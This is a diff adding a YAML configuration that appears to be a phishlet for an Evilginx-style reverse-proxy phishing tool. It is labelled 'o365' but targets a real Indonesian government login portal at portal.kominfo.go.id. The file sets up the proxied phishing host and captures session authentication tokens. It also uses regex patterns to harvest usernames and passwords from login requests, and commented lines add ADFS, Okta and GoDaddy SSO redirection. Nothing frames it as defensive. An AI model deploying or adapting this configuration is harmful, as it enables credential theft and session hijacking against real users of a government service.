@@ -1,0 +1,30 @@
+name: 'o365'
+author: '@NOIR'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'kominfo.go.id', session: true, is_landing: true}
+
+
+sub_filters: []
+  # Uncomment and fill in if your target organization utilizes ADFS
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true }
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+#  - {triggers_on: 'pointb.okta.com', orig_sub: 'pointb', domain: 'okta.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#  - {triggers_on: '{hostname}', orig_sub: 'adfs', domain: '', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.portal.kominfo.go.id'
+    keys: ['']
+credentials:
+  username:
+    key: '(login|Username|email|UserName)'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: '(passwd|Password|password)'
+    search: '(.*)'
+    type: 'json'
+login:
+  domain: 'portal.kominfo.go.id'
+  path: '/site/login'
+
